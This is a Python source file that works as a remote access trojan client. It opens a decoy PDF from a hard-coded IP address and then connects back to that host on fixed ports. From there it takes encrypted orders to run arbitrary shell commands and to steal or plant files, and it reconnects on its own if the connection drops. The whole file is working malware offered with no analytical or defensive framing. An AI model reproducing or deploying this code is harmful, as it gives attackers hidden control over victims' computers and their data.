from os import popen
try:
	popen('start microsoft-edge:http://172.114.170.18/documents/2.pdf')
except:
	pass
import socket
import threading
import os
import time
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad


user = os.popen('whoami').read()

BUFFER_SIZE = 4096
SEPARATOR = "<SEPARATOR>"
CONN = True

def enc_mes(mes, key):
	try:
		cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
		cypher_block = 16
		if type(mes) != bytes:
			mes = mes.encode()
		return cypher.encrypt(pad(mes, cypher_block))
	except:
		pass

def dec_file_mes(mes, key):
	cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
	cypher_block = 16
	s = cypher.decrypt(mes)
	#print(unpad(s, cypher_block))
	return unpad(s, cypher_block)

def dec_mes(mes, key):
	if mes == b'':
		return mes
	else:
		try:
			cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
			cypher_block = 16
			v = cypher.decrypt(mes)
			return unpad(v, cypher_block)
		except:
			return 'echo Try it againg'
def receive_file():
	try:
		client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client2.connect(('172.114.170.18', 54163))
		k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
		client2.send(k.encode())
		while True:
			enc_received = client2.recv(BUFFER_SIZE)
			received = dec_mes(enc_received, k).decode()
			#print(received)
			filename, filesize = received.split(SEPARATOR)
		
			ok_enc = enc_mes('ok2',k)
			client2.send(ok_enc)
			total_bytes = 0
			msg = b''
			while total_bytes < int(filesize):
				bytes_read = client2.recv(BUFFER_SIZE)
				msg += bytes_read 
				total_bytes += len(bytes_read)
			decr_file = dec_mes(msg, k)
			with open(filename, "wb") as f:
				f.write(decr_file)
			break

		client2.close()
	except:
		client2.send('Error transporting file'.encode())

def receive(client,k):
	while True:
		try:
			message = None
			msg = client.recv(1024)
			msg = dec_mes(msg, k)
			message = msg.decode()
			if msg == b'':
				time.sleep(10)
				s = 0
				while msg == b'':
					s += 1
					msg = client.recv(1024)
					if s == 300:
						raise Exception("Reconnect!")
			elif message == 'check':
				enc_answ = enc_mes('check-ok', k)
				client.send(enc_answ)
			elif message == 'send_file':
				receive_file_thread = threading.Thread(target=receive_file)
				receive_file_thread.start()
			elif message == 'get_file':
				okenc = enc_mes('ok', k)
				client.send(okenc)
				while True:
					try:
						path_to_file = client.recv(1024)
						path_to_file = dec_mes(path_to_file, k)

						#filesize = os.path.getsize(path_to_file)
						with open(path_to_file, "rb") as f:
							bytes_read = f.read()
						bytes_enc = enc_mes(bytes_read, k)
						filesize = len(bytes_enc)
						#print(filesize)
						filesize = enc_mes(f'{filesize}', k)
						#print(filesize)
						client.send(filesize)

						vsb = client.recv(1024)
						vsb = dec_mes(vsb, k)

						client.sendall(bytes_enc)
						break
					except:
						try:
							client.send('Error uploading file'.encode('utf-8'))
							break
						except:
							break
			else:
				if message != None and message != '' and message != '\n':
					try:
						answer = os.popen(message).read()
						#print(answer)
						if answer.encode() == b'':
							client.send('Bad command!'.encode('ascii'))
						else:
							enc_answer = enc_mes(answer, k)
							size = str(len(enc_answer))
							client.send(size.encode())
							ch = client.recv(1024).decode()
							if ch == 'ok':
								client.sendall(enc_answer)
					except:
						try:
							client.send('Bad command!'.encode('ascii'))
						except:
							pass	
		except:
			while True:
				try:
					client.close()
					client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					client.connect(('172.114.170.18', 55155))
					k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
					client.send(f"{user}{SEPARATOR}{k}".encode())
					client.settimeout(600)
					time.sleep(60)
					break
				except:
					time.sleep(60)

if __name__ == "__main__":
	while True:
		try:
			client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			client.connect(('172.114.170.18', 55155))
			k = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16))
			client.send(f"{user}{SEPARATOR}{k}".encode())
			client.settimeout(600)
			break
		except:
			time.sleep(50)
	receive_thread = threading.Thread(target=receive,args=(client,k))
	receive_thread.start()
